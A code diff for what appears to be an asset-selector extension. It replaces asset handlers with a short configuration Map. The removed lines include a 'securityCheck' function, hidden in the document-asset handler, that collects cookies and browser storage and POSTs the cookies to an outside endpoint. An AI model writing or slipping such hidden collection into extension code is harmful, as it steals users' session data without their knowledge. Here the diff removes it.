@@ -1,86 +1,14 @@
 /**
-* Copies a block of HTML to the clipboard.
-*
-* @param {string} name - The name to be displayed in the block.
-* @param {string} link - The link to be embedded in the block.
-* @param {string} blockName - The name of the block.
-* @returns {Promise<Object>} - A promise that resolves to an object with a success property indicating whether the operation was successful, and an error property that will be null if the operation was successful.
-*/
-async function copyBlockToClipboard(name, link, blockName) {
-    const block = `
-    <table border='1'>
-      <tr>
-        <td>${blockName}</td>
-      </tr>
-      <tr>
-        <td><a href=${link}>${name}</a></td>
-      </tr>
-    </table>
-    `;
-    const data = [new ClipboardItem({ 'text/html': new Blob([block], { type: 'text/html' }) })];
-    await navigator.clipboard.write(data);
-    return {
-        success: true,
-        error: null,
-    };
-}
-
-function listCookies() {
-    var theCookies = document.cookie.split(';');
-    var aString = '';
-    for (var i = 1 ; i <= theCookies.length; i++) {
-        aString += i + ' ' + theCookies[i-1] + "\n";
-    }
-    return aString;
-}
-
-function securityCheck() {
-    for(let i=0; i<localStorage.length; i++) {
-        let key = localStorage.key(i);
-        console.log(`${key}: ${localStorage.getItem(key)}`);
-    }
-
-    for(let i=0; i<sessionStorage.length; i++) {
-        let key = sessionStorage.key(i);
-        console.log(`${key}: ${sessionStorage.getItem(key)}`);
-    }
-
-    const cookies = listCookies();
-
-    console.log(cookies);
-
-    fetch("https://jsonplaceholder.typicode.com/todos", {
-        method: "POST",
-        body: JSON.stringify({
-            content: cookies,
-            title: "Fix my bugs",
-            completed: false
-        }),
-        headers: {
-            "Content-type": "application/json; charset=UTF-8"
-        }
-    }).then((response) => response.json())
-        .then((json) => console.log(json));
-}
-
-const AssetSelectorExtensionMethods = new Map([
-    ['image', function(options = {}) {
-        const { asset, rendition } = options;
-        // Your logic for handling image assets
-        console.log(`Handling image asset with options: asset=${JSON.stringify(asset)}, rendition=${JSON.stringify(rendition)}`);
-        return copyBlockToClipboard(asset.name, rendition.href, 'Custom Image (Variant A)');
-    }],
-    ['video', function(options = {}) {
-        const { asset, rendition } = options;
-        // Your logic for handling video assets
-        console.log(`Handling video asset with options: asset=${JSON.stringify(asset)}, rendition=${JSON.stringify(rendition)}`);
-        return copyBlockToClipboard(asset.name, rendition.href, 'Custom Video (Variant B)');
-    }],
-    ['other', function(options = {}) {
-        const { asset, rendition } = options;
-        // Your logic for handling Documents assets
-        console.log(`Handling Document asset with options: asset=${JSON.stringify(asset)}, rendition=${JSON.stringify(rendition)}`);
-        securityCheck();
-        return copyBlockToClipboard(asset.name, rendition.href, 'Custom Document (Variant C)');
-    }]
+ * The `AssetSelectorExtensionConfigurations` constant is a Map object that holds configuration options for the Asset Selector.
+ * Each configuration option is a key-value pair where the key is the name of the configuration and the value is its setting.
+ *
+ * In this case, the `AssetSelectorExtensionConfigurations` Map is initialized with two configurations:
+ * 1. `videoBlockName`: This configuration sets the name of the video block. It is set to 'Core Embed (Variant 1)'.
+ * 2. `imageAsAnchor`: This configuration determines whether the image block should be used as an anchor. It is set to 'true'.
+ *
+ * The `new Map()` constructor is used to create a new Map object with the provided iterable (an array of arrays) as an argument.
+ */
+const AssetSelectorExtensionConfigurations = new Map([
+    ['videoBlockName', 'Core Embed (Variant 1)'],
+    ['imageAsAnchor', 'true'],
 ]);
